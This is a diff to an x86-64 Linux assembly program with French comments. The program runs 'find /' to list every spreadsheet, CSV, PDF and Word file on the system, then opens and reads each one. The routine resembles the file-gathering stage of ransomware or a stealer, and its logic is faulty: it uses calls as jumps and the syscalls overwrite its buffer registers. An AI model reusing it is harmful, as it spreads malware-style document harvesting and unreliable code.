@@ -3,12 +3,15 @@ sys_exit equ 60
 sys_write equ 1
 sys_open equ 2
 sys_read equ 0
+sys_wait4 equ 61
 
 global _start
 
 ; /bin/bash -c find / -iregex ".*\.\(xls\|csv\|pdf\|docx\)" -print0 2>>/dev/null 1>> output.txt 
 section .bss
     buffer resb 20000
+    bufferfile resb 20000
+    status resq 1
 section .data
 
     arg0 DB "/bin/bash", 0
@@ -33,12 +36,51 @@ _start:
     JZ child_process
     Call parent_process
 
-path:
+process_path:
+    ; R10 = début du buffer
+    ; R11 = chemin courant du premier fichier
+    ; RCX = fin du buffer
 
-    
+    cmp R11, RCX
+    jge EXIT
+    CALL next_path
 
+next_path:
+    mov al, [R10]
+    test al,al
+    JE increment
+    inc r10
+    CALL next_path
+
+increment:
+    inc r10
+    CALL Open_path
+
+Open_path:
+    MOV R11, R10
+    MOV RAX, sys_open
+    MOV RDI, R11
+    MOV RSI, 0
+    SYSCALL
+    CALL Read_path
+
+Read_path:
+    MOV RDI, RAX
+    MOV RAX, sys_read
+    LEA RSI, bufferfile
+    MOV RDX, 20000
+    SYSCALL
+    CALL process_path
 
 parent_process:
+
+    mov rbx, rax        ; Sauvegarde le PID de l'enfant
+    mov rax, sys_wait4
+    mov rdi, rbx        ; PID de l'enfant à attendre
+    mov rsi, status     ; Pointeur vers le status
+    mov rdx, 0          ; Options
+    mov r10, 0          ; Pointeur vers rusage (NULL)
+    SYSCALL
 
     MOV RAX, sys_open
     MOV RDI, filename
@@ -52,8 +94,8 @@ parent_process:
     SYSCALL
     LEA R10, [rel buffer] ;début du buffer
     LEA R11, [rel buffer] ;chemin courant du premier fichier
-    LEA RCX, [rel buffer + rax] ;Fin du buffer
-    Call path
+    LEA RCX, [buffer + rax] ;Fin du buffer
+    Call Open_path
 
 
 
